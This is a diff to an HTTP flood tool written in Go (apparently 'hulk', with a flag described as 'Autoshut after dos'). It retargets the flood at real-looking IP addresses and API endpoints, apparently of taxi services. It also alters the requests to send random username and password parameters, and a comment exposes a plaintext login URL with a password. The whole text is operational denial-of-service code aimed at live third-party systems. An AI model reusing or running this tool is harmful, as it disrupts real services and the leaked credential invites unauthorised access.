@@ -88,9 +88,12 @@ func main() {
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	// flag.StringVar(&site, "site", "http://map.uz.taxi:8080/reverse?format=jsonv2&lat=41.28407468291545&lon=69.26207811157667&addressdetails=1&accept-language=en", "Destination site.")
 	// flag.StringVar(&site, "site", "http://213.230.120.147", "Destination site.")
-	flag.StringVar(&site, "site", "https://87.237.238.27:8089/driver_candidate_api/v1/settings", "Destination site.")
+	// flag.StringVar(&site, "site", "https://87.237.238.27:8089/driver_candidate_api/v1/settings", "Destination site.")
 	// flag.StringVar(&site, "site", "https://217.30.171.176:3443/api/driver-app/1.0/dict/countries", "Destination site.")
-	// flag.StringVar(&site, "site", "https://213.230.108.254", "Destination site.")
+
+	// skat city
+	// flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/?username=2305&password=GBRHBTYH&lang=en", "Destination site.")
+	flag.StringVar(&site, "site", "http://213.230.120.147", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
@@ -214,7 +217,8 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		var err error
 
 		if data == "" {
-			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+			// q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+			q, err = http.NewRequest("GET", url+param_joiner+"username="+buildblock(rand.Intn(7)+3)+"password="+buildblock(rand.Intn(7)+3), nil)
 		} else {
 			q, err = http.NewRequest("POST", url, strings.NewReader(data))
 		}
